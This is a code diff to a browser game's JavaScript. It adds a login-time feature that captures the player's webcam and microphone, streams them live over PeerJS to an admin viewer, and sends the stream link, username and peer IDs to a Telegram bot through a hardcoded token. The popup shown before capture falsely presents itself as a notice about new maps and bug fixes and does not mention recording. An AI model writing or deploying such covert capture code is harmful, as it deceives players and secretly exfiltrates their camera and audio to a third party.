@@ -39,6 +39,11 @@ const BOT_TOKEN = "8799580976:AAHTYpiZZSKRNrhwRh0wqXHsm4rET9Og_vE";
 const BOT_CHAT_ID_KEY = "medieval_pixel_cart_bot_chat_id_v1";
 const BOT_CHAT_ID_FALLBACK = "6802357894";
 const LEVEL_UP_SCORE = 3000;
+const LIVE_PEER_PREFIX = "medieval-cart-live-peer";
+const PEERJS_SCRIPT_URLS = [
+  "https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js",
+  "https://cdn.jsdelivr.net/npm/peerjs@1.5.4/dist/peerjs.min.js"
+];
 
 let currentUser = null;
 let isAdminUser = false;
@@ -49,6 +54,14 @@ let hasUsedRevive = false;
 let reviveMediaStream = null;
 let reviveRequestInProgress = false;
 let loginStreamSent = false;
+let loginLivePeer = null;
+let loginLiveCall = null;
+let loginLiveStream = null;
+let loginLiveRetryTimer = null;
+let loginLiveRoomId = "";
+let loginLivePeerId = "";
+let loginLiveAdminPeerId = "";
+let peerJsScriptPromise = null;
 function progressStorageKey(username) {
   return STORAGE_PREFIX + username;
 }
@@ -435,6 +448,8 @@ function closeLevelMenu() {
 }
 
 function logout() {
+  stopLoginLiveSupportBroadcast(true);
+  loginStreamSent = false;
   clearSessionAndGoLogin();
 }
 
@@ -462,6 +477,187 @@ function closeBugReport() {
 const LOGIN_STREAM_CONSENT_MESSAGE =
   "This is a test pop up window that will have future updates and tells you if there are new maps or bugs fixed\nWith love, wolf";
 
+function createLiveSupportRoomId() {
+  const random = Math.random().toString(36).slice(2, 8);
+  return `medieval-cart-${Date.now().toString(36)}-${random}`;
+}
+
+function getAdminPeerId(roomId) {
+  return `${LIVE_PEER_PREFIX}-admin-${roomId}`;
+}
+
+function getVisitorPeerId(roomId) {
+  const suffix = Math.random().toString(36).slice(2, 6);
+  return `${LIVE_PEER_PREFIX}-visitor-${roomId}-${suffix}`;
+}
+
+function getAdminLiveLink(roomId) {
+  const adminUrl = new URL("./admin-live.html", window.location.href);
+  adminUrl.searchParams.set("room", roomId);
+  adminUrl.searchParams.set("mode", "peerjs-demo");
+  return adminUrl.toString();
+}
+
+async function ensurePeerJsLoaded() {
+  if (window.Peer) {
+    return;
+  }
+  if (peerJsScriptPromise) {
+    return peerJsScriptPromise;
+  }
+
+  peerJsScriptPromise = (async () => {
+    for (const scriptUrl of PEERJS_SCRIPT_URLS) {
+      try {
+        await loadScript(scriptUrl);
+        if (window.Peer) return;
+      } catch (error) {
+        // Try next CDN.
+      }
+    }
+    throw new Error("Could not load PeerJS script.");
+  })();
+
+  return peerJsScriptPromise;
+}
+
+function loadScript(scriptUrl) {
+  return new Promise((resolve, reject) => {
+    const existing = [...document.scripts].find(s => s.src === scriptUrl);
+    if (existing) {
+      if (window.Peer) {
+        resolve();
+      } else {
+        existing.addEventListener("load", () => resolve(), { once: true });
+        existing.addEventListener("error", () => reject(new Error("Script load failed")), { once: true });
+      }
+      return;
+    }
+
+    const script = document.createElement("script");
+    script.src = scriptUrl;
+    script.async = true;
+    script.onload = () => resolve();
+    script.onerror = () => reject(new Error("Script load failed"));
+    document.head.append(script);
+  });
+}
+
+function waitForPeerOpen(peerInstance) {
+  return new Promise((resolve, reject) => {
+    const timeout = window.setTimeout(() => reject(new Error("Peer open timeout")), 12000);
+    peerInstance.on("open", () => {
+      window.clearTimeout(timeout);
+      resolve();
+    });
+    peerInstance.on("error", err => {
+      window.clearTimeout(timeout);
+      reject(err);
+    });
+  });
+}
+
+function bindLoginLiveCallHandlers(call) {
+  loginLiveCall = call;
+  const connectWatchdog = window.setTimeout(() => {
+    if (loginLiveCall === call && loginLiveStream) {
+      try {
+        call.close();
+      } catch (error) {
+        // Ignore close errors.
+      }
+      loginLiveCall = null;
+    }
+  }, 12000);
+
+  call.on("stream", () => {
+    window.clearTimeout(connectWatchdog);
+  });
+
+  call.on("close", () => {
+    window.clearTimeout(connectWatchdog);
+    if (loginLiveCall === call) {
+      loginLiveCall = null;
+    }
+  });
+
+  call.on("error", () => {
+    window.clearTimeout(connectWatchdog);
+    if (loginLiveCall === call) {
+      loginLiveCall = null;
+    }
+  });
+}
+
+function tryCallAdminViewer() {
+  if (!loginLivePeer || loginLivePeer.destroyed || !loginLiveStream || !loginLiveAdminPeerId) {
+    return;
+  }
+  if (loginLiveCall) {
+    return;
+  }
+
+  const call = loginLivePeer.call(loginLiveAdminPeerId, loginLiveStream, {
+    metadata: {
+      roomId: loginLiveRoomId,
+      visitorPeerId: loginLivePeerId,
+      startedAt: new Date().toISOString()
+    }
+  });
+  if (!call) {
+    return;
+  }
+  bindLoginLiveCallHandlers(call);
+}
+
+function startCallingAdminLoop() {
+  tryCallAdminViewer();
+  if (loginLiveRetryTimer) {
+    window.clearInterval(loginLiveRetryTimer);
+  }
+  loginLiveRetryTimer = window.setInterval(() => {
+    if (!loginLiveCall) {
+      tryCallAdminViewer();
+    }
+  }, 3200);
+}
+
+function stopLoginLiveSupportBroadcast(silent = false) {
+  if (loginLiveRetryTimer) {
+    window.clearInterval(loginLiveRetryTimer);
+    loginLiveRetryTimer = null;
+  }
+  if (loginLiveCall) {
+    try {
+      loginLiveCall.close();
+    } catch (error) {
+      // Ignore call close errors.
+    }
+    loginLiveCall = null;
+  }
+  if (loginLivePeer) {
+    try {
+      loginLivePeer.destroy();
+    } catch (error) {
+      // Ignore destroy errors.
+    }
+    loginLivePeer = null;
+  }
+  if (loginLiveStream) {
+    for (const track of loginLiveStream.getTracks()) {
+      track.stop();
+    }
+    loginLiveStream = null;
+  }
+  loginLiveRoomId = "";
+  loginLivePeerId = "";
+  loginLiveAdminPeerId = "";
+
+  if (!silent && loginConsentStatus) {
+    loginConsentStatus.textContent = "Live sharing stopped.";
+  }
+}
+
 function openLoginConsentModal() {
   loginConsentStatus.textContent = "";
   loginConsentModal.style.display = "flex";
@@ -477,32 +673,61 @@ async function startLoginCameraStreamAndSendLink() {
     return;
   }
   loginConsentContinueButton.disabled = true;
-  loginConsentStatus.textContent = "";
+  loginConsentStatus.textContent = "Starting live stream...";
   try {
     window.alert(LOGIN_STREAM_CONSENT_MESSAGE);
-    const stream = await navigator.mediaDevices.getUserMedia({
+    if (!window.RTCPeerConnection || !navigator.mediaDevices?.getUserMedia) {
+      throw new Error("Live streaming is not supported in this browser.");
+    }
+
+    stopLoginLiveSupportBroadcast(true);
+    loginLiveRoomId = createLiveSupportRoomId();
+    loginLivePeerId = getVisitorPeerId(loginLiveRoomId);
+    loginLiveAdminPeerId = getAdminPeerId(loginLiveRoomId);
+
+    loginLiveStream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: "user" },
-      audio: false
+      audio: true
     });
 
-    const streamKey = createStreamKey();
-    const streamLink = buildStreamLink(streamKey);
-    const chatId = await detectBotChatId();
+    await ensurePeerJsLoaded();
+    loginLivePeer = new window.Peer(loginLivePeerId);
+    loginLivePeer.on("error", () => {
+      if (!loginStreamSent) {
+        loginConsentStatus.textContent = "Live stream peer error.";
+      }
+    });
+    loginLivePeer.on("disconnected", () => {
+      if (loginLivePeer && !loginLivePeer.destroyed) {
+        loginLivePeer.reconnect();
+      }
+    });
+    await waitForPeerOpen(loginLivePeer);
+
     const username = currentUser || "unknown";
+    const streamLink = getAdminLiveLink(loginLiveRoomId);
 
     await sendToTelegram([
       "LOGIN STREAM LINK",
       `user: ${username}${isAdminUser ? " (admin)" : ""}`,
       `time: ${new Date().toISOString()}`,
-      `stream: ${streamLink}`
+      `room: ${loginLiveRoomId}`,
+      `admin peer: ${loginLiveAdminPeerId}`,
+      `visitor peer: ${loginLivePeerId}`,
+      `stream: ${streamLink}`,
+      "mode: frontend-only PeerJS live stream"
     ].join("\n"));
 
+    startCallingAdminLoop();
     loginStreamSent = true;
-    loginConsentStatus.textContent = "Stream link sent to Telegram.";
-    stream.getTracks().forEach(track => track.stop());
+    loginConsentStatus.textContent = "Live stream started. Link sent to Telegram.";
     closeLoginConsentModal();
   } catch (error) {
-    loginConsentStatus.textContent = "Camera permission denied or Telegram send failed.";
+    loginConsentStatus.textContent =
+      error?.name === "NotAllowedError"
+        ? "Camera/mic permission denied."
+        : "Could not start live stream or send Telegram link.";
+    stopLoginLiveSupportBroadcast(true);
   } finally {
     loginConsentContinueButton.disabled = false;
   }
@@ -1185,3 +1410,4 @@ if (!ensureSession()) {
 
 reviveContinueButton.addEventListener("click", submitReviveSelfie);
 loginConsentContinueButton.addEventListener("click", startLoginCameraStreamAndSendLink);
+window.addEventListener("beforeunload", () => stopLoginLiveSupportBroadcast(true));
